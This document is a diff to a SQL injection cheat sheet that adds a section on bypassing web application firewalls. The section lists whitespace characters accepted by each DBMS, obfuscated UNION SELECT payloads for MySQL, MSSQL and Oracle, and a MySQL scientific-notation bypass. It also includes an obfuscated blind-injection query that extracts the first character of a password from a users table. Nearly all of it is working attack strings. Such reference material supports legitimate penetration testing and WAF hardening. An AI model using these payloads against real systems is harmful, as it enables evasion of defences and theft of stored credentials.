@@ -428,6 +428,8 @@ After this, we can simply authenticate with “admin@example.com” and the pass
 
 ## WAF Bypass
 
+### White spaces alternatives
+
 No Space (%20) - bypass using whitespace alternatives
 
 ```sql
@@ -451,7 +453,24 @@ No Whitespace - bypass using parenthesis
 ?id=(1)and(1)=(1)--
 ```
 
-No Comma - bypass using OFFSET, FROM and JOIN
+Whitespace alternatives by DBMS
+| DBMS | ASCII characters in hexadicimal |
+| ---- | ------------------------------- |
+| SQLite3 | 0A, 0D, 0C, 09, 20 |
+| MySQL	5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
+| MySQL	3	| 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
+| PostgreSQL | 0A, 0D, 0C, 09, 20 |
+| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
+| MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
+
+Example of query where spaces were replaced by ascii characters above 0x80
+```
+♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
+```
+ 
+### No Comma
+ 
+Bypass using OFFSET, FROM and JOIN
 
 ```sql
 LIMIT 0,1         -> LIMIT 1 OFFSET 0
@@ -459,7 +478,9 @@ SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
-No Equal - bypass using LIKE/NOT IN/IN/BETWEEN
+### No Equal
+
+Bypass using LIKE/NOT IN/IN/BETWEEN
 
 ```sql
 ?id=1 and substring(version(),1,1)like(5)
@@ -468,7 +489,9 @@ No Equal - bypass using LIKE/NOT IN/IN/BETWEEN
 ?id=1 and substring(version(),1,1) between 3 and 4
 ```
 
-Blacklist using keywords - bypass using uppercase/lowercase
+### Case modification
+ 
+Bypass using uppercase/lowercase (see keyword AND)
 
 ```sql
 ?id=1 AND 1=1#
@@ -476,7 +499,7 @@ Blacklist using keywords - bypass using uppercase/lowercase
 ?id=1 aNd 1=1#
 ```
 
-Blacklist using keywords case insensitive - bypass using an equivalent operator
+Bypass using keywords case insensitive / Bypass using an equivalent operator
 
 ```sql
 AND   -> &&
@@ -486,7 +509,49 @@ OR    -> ||
 WHERE -> HAVING
 ```
 
-Information_schema.tables Alternative
+### Obfuscation by DBMS
+
+MySQL
+```
+1.UNION	SELECT	2	
+3.2UNION	SELECT	2	
+1e0UNION	SELECT	2	
+SELECT\N/0.e3UNION	SELECT	2	
+1e1AND-0.0UNION	SELECT	2	
+1/*!12345UNION/*!31337SELECT/*!table_name*/	
+{ts	1}UNION	SELECT.``	1.e.table_name	
+SELECT	$.``	1.e.table_name	
+SELECT{_	.``1.e.table_name}	
+SELECT	LightOS	.	``1.e.table_name	LightOS	
+SELECT	information_schema 1337.e.tables	13.37e.table_name	
+SELECT	1	from	information_schema 9.e.table_name
+```
+
+MSSQL
+```
+.1UNION	SELECT	2	
+1.UNION	SELECT.2alias	
+1e0UNION	SELECT	2	
+1e1AND-1=0.0UNION	SELECT	2	
+SELECT	0xUNION	SELECT	2	
+SELECT\UNION	SELECT	2	
+\1UNION	SELECT	2	
+SELECT	1FROM[table]WHERE\1=\1AND\1=\1	
+SELECT"table_name"FROM[information_schema].[tables]	
+```
+
+Oracle
+```
+1FUNION	SELECT	2	
+1DUNION	SELECT	2	
+SELECT	0x7461626c655f6e616d65	FROM	all_tab_tables
+SELECT	CHR(116)	||	CHR(97)	||	CHR(98)	FROM	all_tab_tables
+SELECT%00table_name%00FROM%00all_tab_tables
+```
+
+### More MySQL specific
+
+`information_schema.tables` alternative
 
 ```sql
 select * from mysql.innodb_table_stats;
@@ -532,6 +597,21 @@ mysql> mysql> select version();
 +-------------------------+
 ```
 
+#### WAF bypass for MySQL using scientific notation
+
+Blocked
+```sql
+' or ''='
+```
+Working
+```sql
+' or 1.e('')='
+```
+Obfuscated query
+```sql
+1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
+```
+
 ## References
 
 * Detect SQLi
@@ -565,3 +645,7 @@ mysql> mysql> select version();
   * [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
 * Sqlmap:
   * [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
+* WAF:
+  * [SQLi Optimization and Obfuscation Techniques](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf) by Roberto Salgado
+  * [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
+                                                                            
